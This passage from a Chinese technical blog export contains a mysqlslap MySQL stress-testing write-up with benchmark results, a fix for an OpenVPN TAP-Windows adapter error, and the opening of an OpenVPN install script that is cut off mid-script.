打印内存和CPU的相关信息。</span><br></pre></td></tr></table></figure>



<h4 id="第一次测试"><a href="#第一次测试" class="headerlink" title="第一次测试"></a>第一次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 单线程访问测试</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -uroot -p'QianFeng@123'</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line"></span><br><span class="line"> 测试结果显示单线程连接一次服务器需要3ms。</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 100 个线程同时连接一次</span></span><br><span class="line"> [root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 100 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.281 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.281 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.281 seconds</span><br><span class="line">        Number of clients running queries: 100</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line"></span><br><span class="line">可以看到使用100个线程同时连接一次服务器需要218ms，同单线程比，响应时间大幅度提升，这个不知道是什么原因，需要后续查询下。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 1000个线程同时连接一次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 1000 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">mysqlslap: Error when connecting to server: 1040 Too many connections</span><br><span class="line">mysqlslap: Error when connecting to server: 1040 Too many connections</span><br><span class="line">mysqlslap: Error when connecting to server: 1040 Too many connections</span><br><span class="line"></span><br><span class="line">这里我们发现出现了错误，初步猜测是由于我们没有对服务进行任何优化造成的，mysql的默认线程只有151个，这里我们将他进行修改。</span><br><span class="line">更改Mysql默认线程连接数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 1000 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 12.480 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 12.480 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 12.480 seconds</span><br><span class="line">        Number of clients running queries: 1000</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line"></span><br><span class="line">总结：1000并发连接的处理时间是12.5秒</span><br></pre></td></tr></table></figure>



<h4 id="第二次测试"><a href="#第二次测试" class="headerlink" title="第二次测试"></a>第二次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 单线程10次迭代测试平均值</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -i 10 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line"></span><br><span class="line">总结：与上次结果一样，约3ms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 多线程10次迭代测试平均值</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 100 -i 10 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.208 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.200 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.220 seconds</span><br><span class="line">        Number of clients running queries: 100</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line">总结：较上次测试快一些，应该是优化得原因</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 多线程10次迭代测试平均值</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 1000 -i 10 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 11.156 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 10.944 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 11.631 seconds</span><br><span class="line">        Number of clients running queries: 1000</span><br><span class="line">        Average number of queries per client: 0</span><br></pre></td></tr></table></figure>

<h4 id="第三次测试"><a href="#第三次测试" class="headerlink" title="第三次测试"></a>第三次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 读操作测试  并发10  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c10 --number-of-queries=1000 --auto-generate-sql-load-type=read -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.093 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.093 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.093 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 读操作测试 并发1 共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --number-of-queries=1000 --auto-generate-sql-load-type=read -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.141 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.141 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.141 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 读操作测试 并发500 共10000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c500 --number-of-queries=10000 --auto-generate-sql-load-type=read -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 1.177 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 1.177 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 1.177 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 20</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 写操作测试  并发10  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c10 --number-of-queries=1000 --auto-generate-sql-load-type=write -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.171 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.171 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.171 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 写操作测试  并发1  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --number-of-queries=1000 --auto-generate-sql-load-type=write -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.603 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.603 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.603 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 写操作测试  并发500  共10000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 500 --number-of-queries=10000 --auto-generate-sql-load-type=write -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.871 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.871 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.871 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 20</span><br></pre></td></tr></table></figure>

<h4 id="第四次测试"><a href="#第四次测试" class="headerlink" title="第四次测试"></a>第四次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 混合操作 并发10  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c10 --number-of-queries=1000 --auto-generate-sql-load-type=mixed -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.204 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.204 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.204 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 混合操作 并发1  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --number-of-queries=1000 --auto-generate-sql-load-type=mixed -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.524 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.524 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.524 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 混合操作 并发500  共10000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c500 --number-of-queries=10000 --auto-generate-sql-load-type=mixed -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 9.179 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 9.179 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 9.179 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 20</span><br></pre></td></tr></table></figure>



<h4 id="第五次测试"><a href="#第五次测试" class="headerlink" title="第五次测试"></a>第五次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --concurrency=1,10,500 --number-of-queries 1000 --engine=myisam,innodb,memory --iterations=5 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.151 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.144 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.165 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.105 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.098 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.123 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.216 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.205 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.232 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.524 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.495 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.550 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.198 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.186 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.206 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.326 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.294 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.363 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.119 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.115 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.122 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.085 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.083 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.090 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.205 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.189 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.221 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --concurrency=1,10,500 --number-of-queries 1000 --engine=myisam,innodb,memory --auto-generate-sql-load-type=read --iterations=5 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.113 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.106 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.128 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.072 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.067 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.082 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.168 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.160 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.178 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.142 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.137 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.150 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.098 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.094 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.106 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.202 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.194 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.207 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.092 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.091 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.093 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.056 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.055 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.060 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.158 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.154 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.161 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --concurrency=1,10,500 --number-of-queries 1000 --engine=myisam,innodb,memory --auto-generate-sql-load-type=write --iterations=5 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.054 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.053 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.060 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.038 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.035 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.052 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.137 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.127 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.150 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.603 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.595 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.621 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.141 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.119 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.171 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.192 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.164 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.223 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.046 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.045 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.052 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.038 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.031 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.047 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.121 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.116 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.127 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>压力测试</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenVPN 客户端连接服务器失败及解决方法</title>
    <url>/2019/08/05/OpenVPN%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>老规矩，先上</p>
<h5 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h5><p>出现报错信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> All TAP-Windows adapters on this system are currently <span class="keyword">in</span> use.</span></span><br></pre></td></tr></table></figure>

<h5 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.C:\Program Files\TAP-Windows\bin   安装目录下</span><br><span class="line"></span><br><span class="line">2.以管理员权限运行</span><br><span class="line"></span><br><span class="line">3.addtap.bat</span><br></pre></td></tr></table></figure>

<p>接下来是</p>
<h5 id="问题详情："><a href="#问题详情：" class="headerlink" title="问题详情："></a>问题详情：</h5><p>前几天把OpenVPN服务在公司的一台物理服务器上搭建好之后，防火墙规则，selinux都设置好了，然后把生成的配置文件下载到本地进行测试，发现有连接不上公司内网的问题，但是我确信我的配置没有做错，因为我之前自己研究的时候，在自己云服务器上搭建的是没有任何问题的，然后我又生成一份配置文件给我的同事进行测试，发现他的配置文件可以进行正常的连接。所以基本确定是我自己电脑出现了问题。然后我就去查看对应的日志报错信息，有如下的一段是标红的，具体的配置文件当时忘记截图了，修好之后也不想在复现问题了，就简单的说一下产生问题的原因。</p>
<h5 id="问题原因："><a href="#问题原因：" class="headerlink" title="问题原因："></a>问题原因：</h5><p>上一次在自己云服务器上搭建OpenVPN的时候，我自己的电脑是没有其他VPN软件的，但是由于一些特别的原因，我需要下载一些源码包，就使用了一个VPN，导致网卡被VPN占用，但是依照我的理解，当VPN软件关闭之后就不会在进行网卡的占用了，但是实际上和我想的有很大出入。</p>
<h5 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a>解决方法：</h5><p>所以使用OpenVPN自带的工具，使用管理员权限运行，重新生成一个网卡文件即可。</p>
<p>自带工具所在位置如下</p>
<p><img src= "/img/loading.gif" data-src="/2019/08/05/OpenVPN%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/image-20200815195413985.png" alt="image-20200815195413985"></p>
]]></content>
      <categories>
        <category>OpenVPN</category>
      </categories>
      <tags>
        <tag>OpenVPN</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenVPN极速部署</title>
    <url>/2019/08/14/OpenVPN%E6%9E%81%E9%80%9F%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>将下列脚本给上执行权限，直接运行即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Discard stdin. Needed when running from an one-liner <span class="built_in">which</span> includes a newline</span></span><br><span class="line">read -N 999999 -t 0.001</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Detect Debian users running the script with <span class="string">"sh"</span> instead of bash</span></span><br><span class="line">if readlink /proc/$$/exe | grep -q "dash"; then</span><br><span class="line">	echo 'This installer needs to be run with "bash", not "sh".'</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Detect OpenVZ 6</span></span><br><span class="line">if [[ $(uname -r | cut -d "." -f 1) -eq 2 ]]; then</span><br><span class="line">	echo "The system is running an old kernel, which is incompatible with this installer."</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Detect OS</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="variable">$os_version</span> variables aren<span class="string">'t always in use, but are kept here for convenience</span></span></span><br><span class="line">if grep -qs "ubuntu" /etc/os-release; then</span><br><span class="line">	os="ubuntu"</span><br><span class="line">	os_version=$(grep 'VERSION_ID' /etc/os-release | cut -d '"' -f 2 | tr -d '.')</span><br><span class="line">	group_name="nogroup"</span><br><span class="line">elif [[ -e /etc/debian_version ]]; then</span><br><span class="line">	os="debian"</span><br><span class="line">	os_version=$(grep -oE '[0-9]+' /etc/debian_version | head -1)</span><br><span class="line">	group_name="nogroup"</span><br><span class="line">elif [[ -e /etc/centos-release ]]; then</span><br><span class="line">	os="centos"</span><br><span class="line">	os_version=$(grep -oE '[0-9]+' /etc/centos-release | head -1)</span><br><span class="line">	group_name="nobody"</span><br><span class="line">elif [[ -e /etc/fedora-release ]]; then</span><br><span class="line">	os="fedora"</span><br><span class="line">	os_version=$(grep -oE '[0-9]+' /etc/fedora-release | head -1)</span><br><span class="line">	group_name="nobody"</span><br><span class="line">else</span><br><span class="line">	echo "This installer seems to be running on an unsupported distribution.</span><br><span class="line">Supported distributions are Ubuntu, Debian, CentOS, and Fedora."</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ "$os" == "ubuntu" &amp;&amp; "$os_version" -lt 1804 ]]; then</span><br><span class="line">	echo "Ubuntu 18.04 or higher is required to use this installer.</span><br><span class="line">This version of Ubuntu is too old and unsupported."</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ "$os" == "debian" &amp;&amp; "$os_version" -lt 9 ]]; then</span><br><span class="line">	echo "Debian 9 or higher is required to use this installer.</span><br><span class="line">This version of Debian is too old and unsupported."</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ "$os" == "centos" &amp;&amp; "$os_version" -lt 7 ]]; then</span><br><span class="line">	echo "CentOS 7 or higher is required to use this installer.</span><br><span class="line">This version of CentOS is too old and unsupported."</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Detect environments <span class="built_in">where</span> <span class="variable">$PATH</span> does not include the sbin directories</span></span><br><span class="line">if ! grep -q sbin &lt;&lt;&lt; "$PATH"; 